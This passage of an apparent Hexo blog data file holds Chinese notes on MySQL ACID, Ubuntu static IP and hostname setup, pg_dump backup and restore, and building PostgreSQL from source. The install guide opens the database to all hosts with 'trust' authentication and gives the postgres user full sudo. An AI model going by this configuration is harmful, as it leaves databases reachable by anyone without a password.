title=\"ACID是靠什么保证的\"></a>ACID是靠什么保证的</h1><p>原子性：由undolog日志来保证，他记录了需要回滚的日志信息，事务回滚时撤销已经执行成功的sql</p>\n<p>一致性：由原子性，隔离性，持久性共同保证。</p>\n<p>隔离性：是由MVCC来保证，事务之间相互隔离，多版本并发控制。</p>\n<p>持久性：是由redolog来保证的，mysql修改数据的时候会在redolog中记录一份日志数据，就栓数据没有保存成功，只要日志保存成功了，数据仍然不会丢失。</p>\n<h1 id=\"BeanFactory和ApplicationContext区别\"><a href=\"#BeanFactory和ApplicationContext区别\" class=\"headerlink\" title=\"BeanFactory和ApplicationContext区别\"></a>BeanFactory和ApplicationContext区别</h1>"},{"title":"ubuntu静态ip配置","top":false,"cover":false,"toc":true,"mathjax":true,"date":"2023-02-20T18:51:36.000Z","password":"5c4aaf271c7c13b2372e84982f82f2cd279026950438dfc769c95dcabdfd2a87","summary":"工作的第一天，安排的任务","_content":"\n## 静态ip的分配\n以ubuntu为例\n\n### 选自要查看的网卡\n```shell\nifconfig\n```\n\n> 编辑系统中/etc/network/interfaces中，lo一般为回环地址，不要管他的配置，将要配置的网卡名字在配置一份，如下\n\n```shell\n\n# 上面有回环地址的配置，不用管\n\nauto eth0\niface eth0 inet static\naddress 192.168.1.11\nnetmask 255.255.255.0\ngateway 192.168.1.1\ndns-nameservers 202.106.0.20\ndns-nameservers 8.8.8.8\n```\n\n## 更改主机名\n\n以ubuntu为例\n\n### 更改hosts\n\n> vim /etc/hosts\n\n```shell\n127.0.0.1 newName\n```\n\n### 更改hostName,如果已经存在就删除\n\n> vim /etc/hostname\n\n```shell\nnewName\n```\n\n## 如果程序使用了nginx，一定要注意检查nginx全局块中的user\n默认nobody，将user指令注释掉，或者配置成nobody的话所有用户都可以运行\n\n\n","source":"_posts/工作第一天.md","raw":"---\ntitle: ubuntu静态ip配置\ntop: false\ncover: false\ntoc: true\nmathjax: true\ndate: 2023-02-21 02:51:36\npassword: 5c4aaf271c7c13b2372e84982f82f2cd279026950438dfc769c95dcabdfd2a87\nsummary: 工作的第一天，安排的任务\ntags: linux\ncategories: ip\n---\n\n## 静态ip的分配\n以ubuntu为例\n\n### 选自要查看的网卡\n```shell\nifconfig\n```\n\n> 编辑系统中/etc/network/interfaces中，lo一般为回环地址，不要管他的配置，将要配置的网卡名字在配置一份，如下\n\n```shell\n\n# 上面有回环地址的配置，不用管\n\nauto eth0\niface eth0 inet static\naddress 192.168.1.11\nnetmask 255.255.255.0\ngateway 192.168.1.1\ndns-nameservers 202.106.0.20\ndns-nameservers 8.8.8.8\n```\n\n## 更改主机名\n\n以ubuntu为例\n\n### 更改hosts\n\n> vim /etc/hosts\n\n```shell\n127.0.0.1 newName\n```\n\n### 更改hostName,如果已经存在就删除\n\n> vim /etc/hostname\n\n```shell\nnewName\n```\n\n## 如果程序使用了nginx，一定要注意检查nginx全局块中的user\n默认nobody，将user指令注释掉，或者配置成nobody的话所有用户都可以运行\n\n\n","slug":"工作第一天","published":1,"updated":"2023-03-10T02:50:31.235Z","_id":"cledy5z5h0001g0vg3la73wni","comments":1,"layout":"post","photos":[],"link":"","content":"<h2 id=\"静态ip的分配\"><a href=\"#静态ip的分配\" class=\"headerlink\" title=\"静态ip的分配\"></a>静态ip的分配</h2><p>以ubuntu为例</p>\n<h3 id=\"选自要查看的网卡\"><a href=\"#选自要查看的网卡\" class=\"headerlink\" title=\"选自要查看的网卡\"></a>选自要查看的网卡</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">ifconfig</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<blockquote>\n<p>编辑系统中/etc/network/interfaces中，lo一般为回环地址，不要管他的配置，将要配置的网卡名字在配置一份，如下</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">\n<span class=\"token comment\"># 上面有回环地址的配置，不用管</span>\n\nauto eth0\niface eth0 inet static\naddress <span class=\"token number\">192.168</span>.1.11\nnetmask <span class=\"token number\">255.255</span>.255.0\ngateway <span class=\"token number\">192.168</span>.1.1\ndns-nameservers <span class=\"token number\">202.106</span>.0.20\ndns-nameservers <span class=\"token number\">8.8</span>.8.8<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"更改主机名\"><a href=\"#更改主机名\" class=\"headerlink\" title=\"更改主机名\"></a>更改主机名</h2><p>以ubuntu为例</p>\n<h3 id=\"更改hosts\"><a href=\"#更改hosts\" class=\"headerlink\" title=\"更改hosts\"></a>更改hosts</h3><blockquote>\n<p>vim /etc/hosts</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token number\">127.0</span>.0.1 newName<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"更改hostName-如果已经存在就删除\"><a href=\"#更改hostName-如果已经存在就删除\" class=\"headerlink\" title=\"更改hostName,如果已经存在就删除\"></a>更改hostName,如果已经存在就删除</h3><blockquote>\n<p>vim /etc/hostname</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">newName<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h2 id=\"如果程序使用了nginx，一定要注意检查nginx全局块中的user\"><a href=\"#如果程序使用了nginx，一定要注意检查nginx全局块中的user\" class=\"headerlink\" title=\"如果程序使用了nginx，一定要注意检查nginx全局块中的user\"></a>如果程序使用了nginx，一定要注意检查nginx全局块中的user</h2><p>默认nobody，将user指令注释掉，或者配置成nobody的话所有用户都可以运行</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"静态ip的分配\"><a href=\"#静态ip的分配\" class=\"headerlink\" title=\"静态ip的分配\"></a>静态ip的分配</h2><p>以ubuntu为例</p>\n<h3 id=\"选自要查看的网卡\"><a href=\"#选自要查看的网卡\" class=\"headerlink\" title=\"选自要查看的网卡\"></a>选自要查看的网卡</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">ifconfig</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<blockquote>\n<p>编辑系统中/etc/network/interfaces中，lo一般为回环地址，不要管他的配置，将要配置的网卡名字在配置一份，如下</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">\n<span class=\"token comment\"># 上面有回环地址的配置，不用管</span>\n\nauto eth0\niface eth0 inet static\naddress <span class=\"token number\">192.168</span>.1.11\nnetmask <span class=\"token number\">255.255</span>.255.0\ngateway <span class=\"token number\">192.168</span>.1.1\ndns-nameservers <span class=\"token number\">202.106</span>.0.20\ndns-nameservers <span class=\"token number\">8.8</span>.8.8<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"更改主机名\"><a href=\"#更改主机名\" class=\"headerlink\" title=\"更改主机名\"></a>更改主机名</h2><p>以ubuntu为例</p>\n<h3 id=\"更改hosts\"><a href=\"#更改hosts\" class=\"headerlink\" title=\"更改hosts\"></a>更改hosts</h3><blockquote>\n<p>vim /etc/hosts</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token number\">127.0</span>.0.1 newName<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"更改hostName-如果已经存在就删除\"><a href=\"#更改hostName-如果已经存在就删除\" class=\"headerlink\" title=\"更改hostName,如果已经存在就删除\"></a>更改hostName,如果已经存在就删除</h3><blockquote>\n<p>vim /etc/hostname</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">newName<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h2 id=\"如果程序使用了nginx，一定要注意检查nginx全局块中的user\"><a href=\"#如果程序使用了nginx，一定要注意检查nginx全局块中的user\" class=\"headerlink\" title=\"如果程序使用了nginx，一定要注意检查nginx全局块中的user\"></a>如果程序使用了nginx，一定要注意检查nginx全局块中的user</h2><p>默认nobody，将user指令注释掉，或者配置成nobody的话所有用户都可以运行</p>\n"},{"title":"pg视图导入导出操作","top":false,"cover":false,"toc":true,"mathjax":true,"date":"2023-02-22T13:45:23.000Z","password":"5c4aaf271c7c13b2372e84982f82f2cd279026950438dfc769c95dcabdfd2a87","summary":"视图、表的备份和恢复","_content":"\n## postgresql视图和表的导入导出\n\n看文档的方法，对表和视图都没有用，可能是版本的原因\n\n### 备份数据表或者视图\n\n#### 格式\n\n```shell\npg_dump -p port -U username --no-password -v -cC -b -t schema.view|table -t schema.view|table -T schema.view|table -T schema.view|table -d database > xxx.sql\n```\n\n> `-p` 指定端口\n\n> `-U` 指定用户\n\n> `--no-password` 密码，这里表示没有密码\n\n> `-v` 展示细节\n\n> `-cC` 在重新创建之前，先清除\n\n> `-b` 在转储中包含大对象\n\n> `-t` 转存的表或者视图等，可以有多个\n\n> `-T` 转存除了这个指定的表或试图，可以有多个\n \n> `-d` 属于哪个数据库\n\n#### 例子\n\n```shell\npg_dump -p 11543 -U postgres --no-password -v -cC -b  -t onis.view_visit -t onis.view_study_all -d coreonisdb > 1.sql\n```\n\n```shell\npg_dump -p 11543 -U postgres --no-password -v -cC -b -t onis.view_visit -t onis.view_study_all -d tmonisdatadesc > 1.sql\n```\n\n```shell\npg_dump -p 11543 -U postgres --no-password -v -cC -b -t onis.view_study -t onis.view_study_flow -t onis.view_studyrecord -t onis.studyvisit -t onis.view_studyvisit_flow -d tmonisdatadesc > 2.sql\n```\n\n```shell\npg_dump -p 11543 -U postgres --no-password -v -cC -b -t onis.view_* -t onis.casesearchproject -T onis.view_visit -T onis.view_study_all -T onis.view_study -T onis.view_study-_flow -T onis.view_studyrecord -T view_studyvisit -T onis.view_studyvisit_flow  -d tmonisdatadesc > 3.sql\n```\n\n### 恢复\n\n#### 格式\n\n```shell\npsql -p port -d database -f backupfile\n```\n\n> `-p` 端口\n\n> `-d` 数据库\n\n> `-f` 要恢复的文件\n\n#### 例子\n\n```shell\npsql -p 11543 -d coreonisdb -f 1.sql\n```","source":"_posts/pg.md","raw":"---\ntitle: pg视图导入导出操作\ntop: false\ncover: false\ntoc: true\nmathjax: true\ndate: 2023-02-22 21:45:23\npassword: 5c4aaf271c7c13b2372e84982f82f2cd279026950438dfc769c95dcabdfd2a87\nsummary: 视图、表的备份和恢复\ntags: postgresql\ncategories: sql\n---\n\n## postgresql视图和表的导入导出\n\n看文档的方法，对表和视图都没有用，可能是版本的原因\n\n### 备份数据表或者视图\n\n#### 格式\n\n```shell\npg_dump -p port -U username --no-password -v -cC -b -t schema.view|table -t schema.view|table -T schema.view|table -T schema.view|table -d database > xxx.sql\n```\n\n> `-p` 指定端口\n\n> `-U` 指定用户\n\n> `--no-password` 密码，这里表示没有密码\n\n> `-v` 展示细节\n\n> `-cC` 在重新创建之前，先清除\n\n> `-b` 在转储中包含大对象\n\n> `-t` 转存的表或者视图等，可以有多个\n\n> `-T` 转存除了这个指定的表或试图，可以有多个\n \n> `-d` 属于哪个数据库\n\n#### 例子\n\n```shell\npg_dump -p 11543 -U postgres --no-password -v -cC -b  -t onis.view_visit -t onis.view_study_all -d coreonisdb > 1.sql\n```\n\n```shell\npg_dump -p 11543 -U postgres --no-password -v -cC -b -t onis.view_visit -t onis.view_study_all -d tmonisdatadesc > 1.sql\n```\n\n```shell\npg_dump -p 11543 -U postgres --no-password -v -cC -b -t onis.view_study -t onis.view_study_flow -t onis.view_studyrecord -t onis.studyvisit -t onis.view_studyvisit_flow -d tmonisdatadesc > 2.sql\n```\n\n```shell\npg_dump -p 11543 -U postgres --no-password -v -cC -b -t onis.view_* -t onis.casesearchproject -T onis.view_visit -T onis.view_study_all -T onis.view_study -T onis.view_study-_flow -T onis.view_studyrecord -T view_studyvisit -T onis.view_studyvisit_flow  -d tmonisdatadesc > 3.sql\n```\n\n### 恢复\n\n#### 格式\n\n```shell\npsql -p port -d database -f backupfile\n```\n\n> `-p` 端口\n\n> `-d` 数据库\n\n> `-f` 要恢复的文件\n\n#### 例子\n\n```shell\npsql -p 11543 -d coreonisdb -f 1.sql\n```","slug":"pg","published":1,"updated":"2023-03-10T02:54:44.647Z","_id":"clefqud9r0000rovg0jryae8c","comments":1,"layout":"post","photos":[],"link":"","content":"<h2 id=\"postgresql视图和表的导入导出\"><a href=\"#postgresql视图和表的导入导出\" class=\"headerlink\" title=\"postgresql视图和表的导入导出\"></a>postgresql视图和表的导入导出</h2><p>看文档的方法，对表和视图都没有用，可能是版本的原因</p>\n<h3 id=\"备份数据表或者视图\"><a href=\"#备份数据表或者视图\" class=\"headerlink\" title=\"备份数据表或者视图\"></a>备份数据表或者视图</h3><h4 id=\"格式\"><a href=\"#格式\" class=\"headerlink\" title=\"格式\"></a>格式</h4><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">pg_dump <span class=\"token parameter variable\">-p</span> port <span class=\"token parameter variable\">-U</span> username --no-password <span class=\"token parameter variable\">-v</span> <span class=\"token parameter variable\">-cC</span> <span class=\"token parameter variable\">-b</span> <span class=\"token parameter variable\">-t</span> schema.view<span class=\"token operator\">|</span>table <span class=\"token parameter variable\">-t</span> schema.view<span class=\"token operator\">|</span>table <span class=\"token parameter variable\">-T</span> schema.view<span class=\"token operator\">|</span>table <span class=\"token parameter variable\">-T</span> schema.view<span class=\"token operator\">|</span>table <span class=\"token parameter variable\">-d</span> database <span class=\"token operator\">></span> xxx.sql<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<blockquote>\n<p><code>-p</code> 指定端口</p>\n</blockquote>\n<blockquote>\n<p><code>-U</code> 指定用户</p>\n</blockquote>\n<blockquote>\n<p><code>--no-password</code> 密码，这里表示没有密码</p>\n</blockquote>\n<blockquote>\n<p><code>-v</code> 展示细节</p>\n</blockquote>\n<blockquote>\n<p><code>-cC</code> 在重新创建之前，先清除</p>\n</blockquote>\n<blockquote>\n<p><code>-b</code> 在转储中包含大对象</p>\n</blockquote>\n<blockquote>\n<p><code>-t</code> 转存的表或者视图等，可以有多个</p>\n</blockquote>\n<blockquote>\n<p><code>-T</code> 转存除了这个指定的表或试图，可以有多个</p>\n</blockquote>\n<blockquote>\n<p><code>-d</code> 属于哪个数据库</p>\n</blockquote>\n<h4 id=\"例子\"><a href=\"#例子\" class=\"headerlink\" title=\"例子\"></a>例子</h4><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">pg_dump <span class=\"token parameter variable\">-p</span> <span class=\"token number\">11543</span> <span class=\"token parameter variable\">-U</span> postgres --no-password <span class=\"token parameter variable\">-v</span> <span class=\"token parameter variable\">-cC</span> <span class=\"token parameter variable\">-b</span>  <span class=\"token parameter variable\">-t</span> onis.view_visit <span class=\"token parameter variable\">-t</span> onis.view_study_all <span class=\"token parameter variable\">-d</span> coreonisdb <span class=\"token operator\">></span> <span class=\"token number\">1</span>.sql<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">pg_dump <span class=\"token parameter variable\">-p</span> <span class=\"token number\">11543</span> <span class=\"token parameter variable\">-U</span> postgres --no-password <span class=\"token parameter variable\">-v</span> <span class=\"token parameter variable\">-cC</span> <span class=\"token parameter variable\">-b</span> <span class=\"token parameter variable\">-t</span> onis.view_visit <span class=\"token parameter variable\">-t</span> onis.view_study_all <span class=\"token parameter variable\">-d</span> tmonisdatadesc <span class=\"token operator\">></span> <span class=\"token number\">1</span>.sql<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">pg_dump <span class=\"token parameter variable\">-p</span> <span class=\"token number\">11543</span> <span class=\"token parameter variable\">-U</span> postgres --no-password <span class=\"token parameter variable\">-v</span> <span class=\"token parameter variable\">-cC</span> <span class=\"token parameter variable\">-b</span> <span class=\"token parameter variable\">-t</span> onis.view_study <span class=\"token parameter variable\">-t</span> onis.view_study_flow <span class=\"token parameter variable\">-t</span> onis.view_studyrecord <span class=\"token parameter variable\">-t</span> onis.studyvisit <span class=\"token parameter variable\">-t</span> onis.view_studyvisit_flow <span class=\"token parameter variable\">-d</span> tmonisdatadesc <span class=\"token operator\">></span> <span class=\"token number\">2</span>.sql<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">pg_dump <span class=\"token parameter variable\">-p</span> <span class=\"token number\">11543</span> <span class=\"token parameter variable\">-U</span> postgres --no-password <span class=\"token parameter variable\">-v</span> <span class=\"token parameter variable\">-cC</span> <span class=\"token parameter variable\">-b</span> <span class=\"token parameter variable\">-t</span> onis.view_* <span class=\"token parameter variable\">-t</span> onis.casesearchproject <span class=\"token parameter variable\">-T</span> onis.view_visit <span class=\"token parameter variable\">-T</span> onis.view_study_all <span class=\"token parameter variable\">-T</span> onis.view_study <span class=\"token parameter variable\">-T</span> onis.view_study-_flow <span class=\"token parameter variable\">-T</span> onis.view_studyrecord <span class=\"token parameter variable\">-T</span> view_studyvisit <span class=\"token parameter variable\">-T</span> onis.view_studyvisit_flow  <span class=\"token parameter variable\">-d</span> tmonisdatadesc <span class=\"token operator\">></span> <span class=\"token number\">3</span>.sql<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"恢复\"><a href=\"#恢复\" class=\"headerlink\" title=\"恢复\"></a>恢复</h3><h4 id=\"格式-1\"><a href=\"#格式-1\" class=\"headerlink\" title=\"格式\"></a>格式</h4><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">psql <span class=\"token parameter variable\">-p</span> port <span class=\"token parameter variable\">-d</span> database <span class=\"token parameter variable\">-f</span> backupfile<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<blockquote>\n<p><code>-p</code> 端口</p>\n</blockquote>\n<blockquote>\n<p><code>-d</code> 数据库</p>\n</blockquote>\n<blockquote>\n<p><code>-f</code> 要恢复的文件</p>\n</blockquote>\n<h4 id=\"例子-1\"><a href=\"#例子-1\" class=\"headerlink\" title=\"例子\"></a>例子</h4><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">psql <span class=\"token parameter variable\">-p</span> <span class=\"token number\">11543</span> <span class=\"token parameter variable\">-d</span> coreonisdb <span class=\"token parameter variable\">-f</span> <span class=\"token number\">1</span>.sql<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>","site":{"data":{}},"excerpt":"","more":"<h2 id=\"postgresql视图和表的导入导出\"><a href=\"#postgresql视图和表的导入导出\" class=\"headerlink\" title=\"postgresql视图和表的导入导出\"></a>postgresql视图和表的导入导出</h2><p>看文档的方法，对表和视图都没有用，可能是版本的原因</p>\n<h3 id=\"备份数据表或者视图\"><a href=\"#备份数据表或者视图\" class=\"headerlink\" title=\"备份数据表或者视图\"></a>备份数据表或者视图</h3><h4 id=\"格式\"><a href=\"#格式\" class=\"headerlink\" title=\"格式\"></a>格式</h4><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">pg_dump <span class=\"token parameter variable\">-p</span> port <span class=\"token parameter variable\">-U</span> username --no-password <span class=\"token parameter variable\">-v</span> <span class=\"token parameter variable\">-cC</span> <span class=\"token parameter variable\">-b</span> <span class=\"token parameter variable\">-t</span> schema.view<span class=\"token operator\">|</span>table <span class=\"token parameter variable\">-t</span> schema.view<span class=\"token operator\">|</span>table <span class=\"token parameter variable\">-T</span> schema.view<span class=\"token operator\">|</span>table <span class=\"token parameter variable\">-T</span> schema.view<span class=\"token operator\">|</span>table <span class=\"token parameter variable\">-d</span> database <span class=\"token operator\">></span> xxx.sql<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<blockquote>\n<p><code>-p</code> 指定端口</p>\n</blockquote>\n<blockquote>\n<p><code>-U</code> 指定用户</p>\n</blockquote>\n<blockquote>\n<p><code>--no-password</code> 密码，这里表示没有密码</p>\n</blockquote>\n<blockquote>\n<p><code>-v</code> 展示细节</p>\n</blockquote>\n<blockquote>\n<p><code>-cC</code> 在重新创建之前，先清除</p>\n</blockquote>\n<blockquote>\n<p><code>-b</code> 在转储中包含大对象</p>\n</blockquote>\n<blockquote>\n<p><code>-t</code> 转存的表或者视图等，可以有多个</p>\n</blockquote>\n<blockquote>\n<p><code>-T</code> 转存除了这个指定的表或试图，可以有多个</p>\n</blockquote>\n<blockquote>\n<p><code>-d</code> 属于哪个数据库</p>\n</blockquote>\n<h4 id=\"例子\"><a href=\"#例子\" class=\"headerlink\" title=\"例子\"></a>例子</h4><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">pg_dump <span class=\"token parameter variable\">-p</span> <span class=\"token number\">11543</span> <span class=\"token parameter variable\">-U</span> postgres --no-password <span class=\"token parameter variable\">-v</span> <span class=\"token parameter variable\">-cC</span> <span class=\"token parameter variable\">-b</span>  <span class=\"token parameter variable\">-t</span> onis.view_visit <span class=\"token parameter variable\">-t</span> onis.view_study_all <span class=\"token parameter variable\">-d</span> coreonisdb <span class=\"token operator\">></span> <span class=\"token number\">1</span>.sql<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">pg_dump <span class=\"token parameter variable\">-p</span> <span class=\"token number\">11543</span> <span class=\"token parameter variable\">-U</span> postgres --no-password <span class=\"token parameter variable\">-v</span> <span class=\"token parameter variable\">-cC</span> <span class=\"token parameter variable\">-b</span> <span class=\"token parameter variable\">-t</span> onis.view_visit <span class=\"token parameter variable\">-t</span> onis.view_study_all <span class=\"token parameter variable\">-d</span> tmonisdatadesc <span class=\"token operator\">></span> <span class=\"token number\">1</span>.sql<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">pg_dump <span class=\"token parameter variable\">-p</span> <span class=\"token number\">11543</span> <span class=\"token parameter variable\">-U</span> postgres --no-password <span class=\"token parameter variable\">-v</span> <span class=\"token parameter variable\">-cC</span> <span class=\"token parameter variable\">-b</span> <span class=\"token parameter variable\">-t</span> onis.view_study <span class=\"token parameter variable\">-t</span> onis.view_study_flow <span class=\"token parameter variable\">-t</span> onis.view_studyrecord <span class=\"token parameter variable\">-t</span> onis.studyvisit <span class=\"token parameter variable\">-t</span> onis.view_studyvisit_flow <span class=\"token parameter variable\">-d</span> tmonisdatadesc <span class=\"token operator\">></span> <span class=\"token number\">2</span>.sql<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">pg_dump <span class=\"token parameter variable\">-p</span> <span class=\"token number\">11543</span> <span class=\"token parameter variable\">-U</span> postgres --no-password <span class=\"token parameter variable\">-v</span> <span class=\"token parameter variable\">-cC</span> <span class=\"token parameter variable\">-b</span> <span class=\"token parameter variable\">-t</span> onis.view_* <span class=\"token parameter variable\">-t</span> onis.casesearchproject <span class=\"token parameter variable\">-T</span> onis.view_visit <span class=\"token parameter variable\">-T</span> onis.view_study_all <span class=\"token parameter variable\">-T</span> onis.view_study <span class=\"token parameter variable\">-T</span> onis.view_study-_flow <span class=\"token parameter variable\">-T</span> onis.view_studyrecord <span class=\"token parameter variable\">-T</span> view_studyvisit <span class=\"token parameter variable\">-T</span> onis.view_studyvisit_flow  <span class=\"token parameter variable\">-d</span> tmonisdatadesc <span class=\"token operator\">></span> <span class=\"token number\">3</span>.sql<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"恢复\"><a href=\"#恢复\" class=\"headerlink\" title=\"恢复\"></a>恢复</h3><h4 id=\"格式-1\"><a href=\"#格式-1\" class=\"headerlink\" title=\"格式\"></a>格式</h4><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">psql <span class=\"token parameter variable\">-p</span> port <span class=\"token parameter variable\">-d</span> database <span class=\"token parameter variable\">-f</span> backupfile<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<blockquote>\n<p><code>-p</code> 端口</p>\n</blockquote>\n<blockquote>\n<p><code>-d</code> 数据库</p>\n</blockquote>\n<blockquote>\n<p><code>-f</code> 要恢复的文件</p>\n</blockquote>\n<h4 id=\"例子-1\"><a href=\"#例子-1\" class=\"headerlink\" title=\"例子\"></a>例子</h4><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">psql <span class=\"token parameter variable\">-p</span> <span class=\"token number\">11543</span> <span class=\"token parameter variable\">-d</span> coreonisdb <span class=\"token parameter variable\">-f</span> <span class=\"token number\">1</span>.sql<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>"},{"title":"Postgresql安装部署","top":false,"cover":false,"toc":true,"mathjax":true,"date":"2023-03-02T08:15:25.000Z","password":"5c4aaf271c7c13b2372e84982f82f2cd279026950438dfc769c95dcabdfd2a87","summary":"postgresql单机安装部署","_content":"\n## PostgreSql\n\n### 下载postgresql源码\n\n> 以Ubuntu为例\n\n下载PostgreSql源码包\n```shell\nwget https://ftp.postgresql.org/pub/source/v13.0/postgresql-13.0.tar.gz\n```\n\n解压源码包\n```shell\ntar -zxvf postgresql-13.0.tar.gz -C /home/\n```\n\n### 安装前准备工作\n\n安装编译工具及相关依赖\n```shell\n apt-get -y install zlib1g-dev libreadline-dev # 安装依赖\n apt-get -y install binutils\n apt-get -y install gcc\n apt-get -y install g++\n apt-get -y install sysstat\n apt-get -y install unixodbc unixodbc-dev\n```\n\n创建用户\n```shell\nadduser postgres\n```\n\npostgres用户提权`/etc/sudoers`\n```\npostgres ALL=(ALL:ALL) ALL\n```\n\n创建postgresql相关目录和文件夹所属关系\n```shell\nmkdir /home/postgres/data\nmkdir /home/postgres/init\nchown -R postgres:postgres /home/postgres\n```\n\n### 编译安装PostgreSql\n\n进入源码目录\n```shell\ncd /home/postgresql-13.0\n```\n\nconfigure执行配置准备构建环境\n```\n./configure --with-pgport=5432 \\\n  --prefix=/usr/local/pgsql \\\n  --with-systemd \\\n  --with-blocksize=8 \\\n  --with-segsize=1 \\\n  --with-wal-blocksize=8 \\\n  --without-readline \\\n  --datadir=/home/postgres/init\n```\n\n> configure参数说明\n\n```shell\n--with-pgport 指定端口\n--prefix  安装目录\n--with-systemd 编译对systemd 服务通知的支持。如果服务器是在systemd机制下被启动，这可以提高集成度，否则不会有影响 。要使用这个选项，必须安装libsystemd 以及相关的头文件\n--with-blocksize 设置块大小，单位K。2的N次幂，1-32K之间\n--with-segsize 超大数据表文件，会切分成若干个大小不超过SEGSIZE的小文件。该值的设置参考系统大文件的最大值。单位G。2的N次幂\n--with-wal-blocksize 指定WAL日志文件的大小,单位M。2的N次幂。设置区间 1 - 1024M\n--without-readline 避免使用Readline库（以及libedit）。这个选项禁用了psql中的命令行编辑和历史， 因此我们不建议这么做\n--without-zlib\t避免使用Zlib库。这样就禁用了pg_dump和 pg_restore中对压缩归档的支持。这个选项只适用于那些没有这个库的少见的系统\n```\n\n编译安装\n```shell\nmake && make install\n```\n\n### 初始化数据库\n\n执行下面的命令对数据库进行初始化，数据库的初始化需要切换到`postgres`用户\n```shell\nsu postgres\n/usr/local/pgsql/bin/initdb -D /home/postgres/data\n```\n\n创建systemd配置文件`/etc/systemd/system/pgserver.service`\n```shell\n[Unit]\nDescription=PostgreSQL database server\nDocumentation=man:postgres(1)\n\n[Service]\nType=notify\nUser=postgres\nExecStart=/usr/local/pgsql/bin/postgres -D /home/postgres/data\nExecReload=/bin/kill -HUP $MAINPID\nKillMode=mixed\nKillSignal=SIGINT\nTimeoutSec=0\n\n[Install]\nWantedBy=multi-user.target\n```\n\n配置开机启动并启动PostgreSQL\n```\nsystemctl enable pgserver --now\n```\n\n编辑`~/.bashrc`添加下面数据\n```shell\nalias psql=\"/usr/local/pgsql/bin/psql\"\nalias pg_dump=\"/usr/local/pgsql/bin/pg_dump\"\nalias pg_restore=\"/usr/local/pgsql/bin/pg_resotre\"\n```\n\n使其生效\n```shell\nsource ~/.bashrc\n```\n\n使用默认`postgres`用户登录\n```shell\npsql -p 5432\n```\n\n修改数据库用户`postgres`密码\n```shell\n\\password\n```\n\n### 连接配置\n\n修改`/home/postgres/data/postgresql.conf`配置文件，设置监听地址\n```shell\nlisten_addresses  = \"*\"\n```\n\n修改`/home/postgres/data/pg_hba.conf(host-based authentication file)`配置连接方式（添加）\n```shell\nhost    all    all    0.0.0.0/0    trust\n```\n\n修改配置后重启数据库服务即可\n```shell\nsystemctl restart pgserver\n```\n","source":"_posts/Postgresql安装部署.md","raw":"---\ntitle: Postgresql安装部署\ntop: false\ncover: false\ntoc: true\nmathjax: true\ndate: 2023-03-02 16:15:25\npassword: 5c4aaf271c7c13b2372e84982f82f2cd279026950438dfc769c95dcabdfd2a87\nsummary: postgresql单机安装部署\ntags: db\ncategories: pgsql\n---\n\n## PostgreSql\n\n### 下载postgresql源码\n\n> 